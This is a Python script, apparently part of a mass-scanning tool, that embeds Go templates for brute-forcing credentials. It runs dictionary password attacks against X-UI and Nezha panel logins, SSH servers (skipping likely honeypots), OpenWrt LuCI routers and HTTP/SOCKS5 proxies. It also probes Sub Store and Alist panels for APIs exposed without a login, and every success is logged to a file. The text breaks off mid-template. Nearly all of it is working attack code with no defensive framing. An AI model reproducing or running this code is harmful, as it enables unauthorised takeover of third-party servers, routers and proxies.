# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
import base64
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== 依赖导入强化 ====================
# 在脚本最开始就强制检查核心依赖，如果失败则直接退出
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    print(f"❌ 错误：核心 Python 模块 '{e.name}' 缺失！")
    print("👉 请先手动安装所有依赖：")
    print("python3 -m pip install psutil requests pyyaml openpyxl tqdm colorama --break-system-packages")
    sys.exit(1)

try:
    import readline
except ImportError:
    pass
# =================================================

# ==================== 新增全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板（已净化并增加注释） ===========================
# 为防止BOM字符问题，所有Go模板都重写为行列表

# === 模板 1: XUI 面板 (常规登录) ===
XUI_GO_TEMPLATE_1_LINES = [
    "package main",
    "import (",
	"	\"bufio\"",
	"	\"context\"",
	"	\"crypto/tls\"",
	"	\"encoding/json\"",
	"	\"fmt\"",
	"	\"io\"",
	"	\"net/http\"",
	"	\"net/url\"",
	"	\"os\"",
	"	\"strings\"",
	"	\"sync\"",
	"	\"time\"",
    ")",
    "// worker 函数是并发执行的工作单元，从 tasks 通道接收任务",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "   // 创建可复用的 HTTP客户端, 跳过TLS验证并禁用长连接以提高性能",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	// 循环处理从通道接收到的每一个IP:端口",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "// processIP 函数处理单个 IP:端口，尝试使用字典爆破",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	// 解析输入行，提取 host:port 部分",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]",
    "	// 遍历用户名和密码字典",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "           // 尝试 HTTP 协议",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/login\", ip, port)",
    "			payloadHttp := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
    "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			// 如果 HTTP 失败，则尝试 HTTPS 协议",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/login\", ip, port)",
    "				payloadHttps := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(payloadHttps))",
    "				reqHttps.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil { if resp != nil { resp.Body.Close() }; continue }",
    "			// 检查响应状态码是否为200 OK",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					// 解析返回的 JSON 数据，检查 'success' 字段是否为 true",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close()",
    "							return // 找到正确的凭据后，立即返回，不再尝试此IP",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body) // 丢弃响应体以释放连接",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "// main 函数是程序的入口",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	// 启动指定数量的 worker goroutine",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	// 读取输入文件并将任务发送到通道",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks) // 关闭通道，通知 worker 没有更多任务",
    "	wg.Wait()    // 等待所有 worker 完成",
    "}",
]

# === 模板 2: 哪吒面板 ===
XUI_GO_TEMPLATE_2_LINES = [
    "package main",
    "import (",
	"	\"bufio\"",
	"	\"context\"",
	"	\"crypto/tls\"",
	"	\"encoding/json\"",
	"	\"fmt\"",
	"	\"io\"",
	"	\"net/http\"",
	"	\"net/url\"",
	"	\"os\"",
	"	\"strings\"",
	"	\"sync\"",
	"	\"time\"",
    ")",
    "// worker 函数与模板1类似，是并发执行单元",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "// processIP 针对哪吒面板的登录API进行爆破",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			// 哪吒面板使用 JSON 格式的 payload",
    "			data := map[string]string{\"username\": username, \"password\": password}",
    "			jsonPayload, _ := json.Marshal(data)",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			// API 路径为 /api/v1/login",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/api/v1/login\", ip, port)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(string(jsonPayload)))",
    "			reqHttp.Header.Set(\"Content-Type\", \"application/json\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/api/v1/login\", ip, port)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(string(jsonPayload)))",
    "				reqHttps.Header.Set(\"Content-Type\", \"application/json\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil { if resp != nil { resp.Body.Close() }; continue }",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						// 哪吒面板成功登录的判断条件更复杂",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close()",
    "							return",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# === 模板 6: SSH ===
XUI_GO_TEMPLATE_6_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"log\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/crypto/ssh\"",
    ")",
    "// processIP 针对 SSH 服务进行爆破",
    "func processIP(line string, file *os.File, usernames []string, passwords []string) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "   log.Printf(\"Scanning SSH: %s:%s\", ip, port)",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			// 尝试使用用户名和密码进行SSH连接",
    "			client, success, _ := trySSH(ip, port, username, password)",
    "			if success {",
    "               // 检查是否为蜜罐",
    "				if !isLikelyHoneypot(client) {",
    "					file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "				}",
    "				client.Close()",
    "				return",
    "			}",
    "		}",
    "	}",
    "}",
    "// trySSH 封装了SSH连接的尝试逻辑",
    "func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {",
    "	addr := fmt.Sprintf(\"%s:%s\", ip, port)",
    "	config := &ssh.ClientConfig{",
    "		User:            username,",
    "		Auth:            []ssh.AuthMethod{ssh.Password(password)},",
    "		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // 忽略主机密钥验证",
    "		Timeout:         {timeout} * time.Second,",
    "	}",
    "	client, err := ssh.Dial(\"tcp\", addr, config)",
    "    return client, err == nil, err",
    "}",
    "// isLikelyHoneypot 通过执行简单命令来检测蜜罐",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession()",
    "	if err != nil { return true }",
    "	defer session.Close()",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
    "	if err != nil { return true }",
    "	// 执行 'echo $((1+1))'，正常系统应返回 '2'",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
    "	if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
    "// worker 函数与模板1类似",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords)",
    "	}",
    "}",
]

# === 模板 7: Sub Store ===
XUI_GO_TEMPLATE_7_LINES = [
    "package main",
    "import (",
	"	\"bufio\"",
	"	\"context\"",
	"	\"crypto/tls\"",
	"	\"fmt\"",
	"	\"io\"",
	"	\"net/http\"",
	"	\"net/url\"",
	"	\"os\"",
	"	\"strings\"",
	"	\"sync\"",
	"	\"time\"",
    ")",
    "// processIP 针对 Sub Store 的 API 路径进行探测",
    "func processIP(line string, file *os.File, paths []string, client *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	// 遍历可能的路径",
    "	for _, path := range paths {",
    "		if tryBothProtocols(ipPort, path, client, file) { break }",
    "	}",
    "}",
    "// tryBothProtocols 尝试 HTTP 和 HTTPS",
    "func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {",
    "	cleanPath := strings.Trim(path, \"/\")",
    "	fullPath := cleanPath + \"/api/utils/env\"",
    "	// 尝试 HTTP",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"http://%s?api=http://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	// 尝试 HTTPS",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"https://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"https://%s?api=https://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	return false",
    "}",
    "// sendRequest 发送GET请求并检查响应内容",
    "func sendRequest(client *http.Client, fullURL string) (bool, error) {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	req, err := http.NewRequestWithContext(ctx, \"GET\", fullURL, nil)",
    "	if err != nil { return false, err }",
    "	resp, err := client.Do(req)",
    "	if err != nil { if resp != nil { resp.Body.Close() }; return false, err }",
    "	defer resp.Body.Close()",
    "	if resp.StatusCode == http.StatusOK {",
    "		bodyBytes, readErr := io.ReadAll(resp.Body)",
    "		if readErr != nil { return false, readErr }",
    "		// 检查响应体是否包含特定的成功标识",
    "		if strings.Contains(string(bodyBytes), `{\"status\":\"success\",\"data\"`) {",
    "			return true, nil",
    "		}",
    "	}",
    "	io.Copy(io.Discard, resp.Body)",
    "	return false, nil",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, paths)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
    "// worker 函数，但最后一个参数是 paths 列表",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{ TLSClientConfig:   &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, paths, client)",
    "	}",
    "}",
]

# === 模板 8: OpenWrt/iStoreOS ===
XUI_GO_TEMPLATE_8_LINES = [
    "package main",
    "import (",
	"	\"bufio\"",
	"	\"context\"",
	"	\"crypto/tls\"",
	"	\"fmt\"",
	"	\"io\"",
	"	\"net/http\"",
	"	\"net/url\"",
	"	\"os\"",
	"	\"strings\"",
	"	\"sync\"",
	"	\"time\"",
    ")",
    "// processIP 针对 OpenWrt 的 luci 登录接口进行爆破",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {",
    "	targets := []string{}",
    "	trimmed := strings.TrimSpace(line)",
    "	// 同时支持 http 和 https",
    "	if strings.HasPrefix(trimmed, \"http\") { targets = append(targets, trimmed) } else { targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed) }",
    "	for _, target := range targets {",
    "		u, err := url.Parse(target)",
    "		if err != nil { continue }",
    "		origin := u.Scheme + \"://\" + u.Host",
    "		referer := origin + \"/\"",
    "		for _, username := range usernames {",
    "			for _, password := range passwords {",
    "				if checkLogin(target, username, password, origin, referer, client) {",
    "					file.WriteString(fmt.Sprintf(\"%s %s %s\\n\", target, username, password))",
    "					return",
    "				}",
    "			}",
    "		}",
    "	}",
    "}",
    "// checkLogin 发送登录请求并检查 Cookie",
    "func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	// OpenWrt 的登录 payload 格式",
    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))",
    "	if err != nil { return false }",
    "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"Origin\", origin)",
    "	req.Header.Set(\"Referer\", referer)",
    "	resp, err := client.Do(req)",
    "	if err != nil { if resp != nil { resp.Body.Close() }; return false }",
    "	defer resp.Body.Close()",
    "	io.Copy(io.Discard, resp.Body)",
    "	// 关键：检查响应中是否有名为 'sysauth_http' 的 Cookie",
    "	for _, c := range resp.Cookies() {",
    "		if c.Name == \"sysauth_http\" && c.Value != \"\" {",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
    "// worker 函数，需要一个特殊的 client 来处理重定向",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{ TLSClientConfig:   &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	client := &http.Client{",
    "		Transport: tr,",
    "		Timeout: {timeout} * time.Second,",
    "		// 阻止自动重定向，以便我们可以检查登录响应中的Cookie",
    "		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, client)",
    "	}",
    "}",
]


# ==================== 代理模板修复 ====================
PROXY_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io/ioutil\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/net/proxy\"",
    ")",
    "var (",
    "	proxyType    = \"{proxy_type}\" // 代理类型 (http, https, socks5)",
    "	authMode     = {auth_mode}      // 认证模式 (1:无, 2:字典, 3:组合)",
    "	testURL      = \"http://myip.ipip.net\" // 测试连通性的目标URL",
    "	realIP       = \"\"             // 本机的公网IP",
    ")",
    "// processProxy 根据认证模式，检查代理是否可用",
    "func processProxy(proxyAddr string, outputFile *os.File) {",
    "	var found bool // 标记是否已找到可用凭据",
    "	checkAndFormat := func(auth *proxy.Auth) {",
    "        if found { return } // 如果已找到，则跳过后续检查",
    "		success, _ := checkConnection(proxyAddr, auth)",
    "		if success {",
    "            found = true",
    "			var result string",
    "			if auth != nil && auth.User != \"\" {",
    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "			} else {",
    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "			}",
    "			outputFile.WriteString(result + \"\\n\")",
    "		}",
    "	}",
    "	switch authMode {",
    "	case 1: // 无认证",
    "		checkAndFormat(nil)",
    "	case 2: // 用户名/密码字典",
    "		usernames := {user_list}",
    "		passwords := {pass_list}",
    "		for _, user := range usernames {",
    "			for _, pass := range passwords {",
    "				if found { return }",
    "				auth := &proxy.Auth{User: user, Password: pass}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	case 3: // 组合凭据 (user:pass)",
    "		credentials := {creds_list}",
    "		for _, cred := range credentials {",
    "			if found { return }",
    "			parts := strings.SplitN(cred, \":\", 2)",
    "			if len(parts) == 2 {",
    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	}",
    "}",
    "// getPublicIP 获取本机的公网IP地址",
    "func getPublicIP(targetURL string) (string, error) {",
    "	client := &http.Client{Timeout: 15 * time.Second}",
    "	req, err := http.NewRequest(\"GET\", targetURL, nil)",
    "	if err != nil { return \"\", err }",
    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
    "	resp, err := client.Do(req)",
    "	if err != nil { return \"\", err }",
    "	defer resp.Body.Close()",
    "	body, err := ioutil.ReadAll(resp.Body)",
    "	if err != nil { return \"\", err }",
    "	ipString := string(body)",
    "	// 兼容 IPIP.net 的输出格式",
    "	if strings.Contains(ipString, \"当前 IP：\") {",
    "		parts := strings.Split(ipString, \"：\")",
    "		if len(parts) > 1 { return strings.Split(parts[1], \" \")[0], nil }",
    "	}",
    "	return strings.TrimSpace(ipString), nil",
    "}",
    "// checkConnection 核心函数，创建代理连接并访问测试URL",
    "func checkConnection(proxyAddr string, auth *proxy.Auth) (bool, error) {",
    "	transport := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	timeout := {timeout} * time.Second",
    "	if proxyType == \"http\" || proxyType == \"https\" {",
    "		var proxyURLString string",
    "		if auth != nil && auth.User != \"\" {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "		} else {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "		}",
    "		proxyURL, err := url.Parse(proxyURLString)",
    "		if err != nil { return false, err }",
    "		transport.Proxy = http.ProxyURL(proxyURL)",
    "	} else { // SOCKS5",
    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{ Timeout: timeout, KeepAlive: 30 * time.Second })",
    "		if err != nil { return false, err }",
    "		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) { return dialer.Dial(network, addr) }",
    "	}",
    "	httpClient := &http.Client{ Transport: transport, Timeout: timeout }",
    "	req, err := http.NewRequest(\"GET\", testURL, nil)",
    "	if err != nil { return false, err }",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "	resp, err := httpClient.Do(req)",
    "	if err != nil { if resp != nil { resp.Body.Close() }; return false, err }",
    "	defer resp.Body.Close()",
    "	body, readErr := ioutil.ReadAll(resp.Body)",
    "	if readErr != nil { return false, fmt.Errorf(\"无法读取响应\") }",
    "	proxyIP := string(body)",
    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
    "		parts := strings.Split(proxyIP, \"：\")",
    "		if len(parts) > 1 { proxyIP = strings.Split(parts[1], \" \")[0] }",
    "	}",
    "	proxyIP = strings.TrimSpace(proxyIP)",
    "	// 关键: 比较代理IP和本机IP，如果相同则是透明代理，无效",
    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false, fmt.Errorf(\"无法获取IP验证\") }",
    "	if proxyIP == realIP { return false, fmt.Errorf(\"透明代理\") }",
    "	return true, nil",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	var err error",
    "	// 启动时先获取一次本机公网IP",
    "	realIP, err = getPublicIP(testURL)",
    "	if err != nil { realIP = \"UNKNOWN\" }",
    "	proxies, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer proxies.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(proxies)",
    "	for scanner.Scan() {",
    "		proxyAddr := strings.TrimSpace(scanner.Text())",
    "		if proxyAddr != \"\" { tasks <- proxyAddr }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
    "func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for proxyAddr := range tasks {",
    "		processProxy(proxyAddr, outputFile)",
    "	}",
    "}",
]

# === 模板 9: Alist 面板 ===
ALIST_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "// processIP 探测 Alist 面板的 /api/me 接口",
    "func processIP(ipPort string, file *os.File, httpClient *http.Client) {",
    "	parts := strings.SplitN(ipPort, \":\", 2)",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, proto := range []string{\"http\", \"https\"} {",
    "		base := fmt.Sprintf(\"%s://%s:%s\", proto, ip, port)",
    "		testURL := base + \"/api/me\"",
    "		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)",
    "		req, err := http.NewRequestWithContext(ctx, \"GET\", testURL, nil)",
    "		if err != nil { cancel(); continue }",
    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "		req.Header.Set(\"Connection\", \"close\")",
    "		resp, err := httpClient.Do(req)",
    "       cancel()",
    "		if err != nil { if resp != nil { resp.Body.Close() }; continue }",
    "		// 检查响应是否为有效的 Alist 面板响应",
    "		if isValidResponse(resp) {",
    "			file.WriteString(base + \"\\n\")",
    "			resp.Body.Close()",
    "			return",
    "		}",
    "		resp.Body.Close()",
    "	}",
    "}",
    "// isValidResponse 检查响应JSON中 'code' 字段是否为200",
    "func isValidResponse(resp *http.Response) bool {",
    "	if resp == nil { return false }",
    "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
    "	if err != nil { return false }",
    "	var data map[string]interface{}",
    "	if err := json.Unmarshal(body, &data); err != nil { return false }",
    "	if v, ok := data[\"code\"]; ok {",
    "		switch t := v.(type) {",
    "		case float64: return int(t) == 200",
    "		case string: return t == \"200\"",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
